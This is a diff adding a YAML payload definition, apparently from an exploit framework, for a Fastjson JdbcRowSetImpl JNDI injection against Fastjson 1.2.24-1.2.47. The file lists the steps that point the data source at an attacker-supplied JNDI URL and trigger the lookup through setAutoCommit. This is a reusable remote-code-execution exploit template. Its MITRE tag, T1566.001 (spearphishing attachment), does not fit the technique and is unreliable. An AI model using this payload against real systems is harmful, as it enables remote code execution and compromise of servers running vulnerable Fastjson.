@@ -1,0 +1,26 @@
+name: "FastjsonJdbcRowSetImpl"
+category: "fastjson"
+description: "Fastjson JdbcRowSetImpl JNDI injection via autoCommit"
+jdk_version: "all"
+dependencies:
+  - name: "fastjson"
+    version: "1.2.24-1.2.47"
+exploit_type: "jndi_injection"
+payload_type: "jndi"
+risk_level: 5
+mitre_technique: "T1566.001"
+references:
+  - "https://github.com/alibaba/fastjson/issues"
+steps:
+  - class_name: "com.sun.rowset.JdbcRowSetImpl"
+    method_name: "setDataSourceName"
+    parameters:
+      - "{jndi_url}"
+  - class_name: "com.sun.rowset.JdbcRowSetImpl"
+    method_name: "setAutoCommit"
+    parameters:
+      - "true"
+  - class_name: "javax.naming.InitialContext"
+    method_name: "lookup"
+    parameters:
+      - "{jndi_url}"
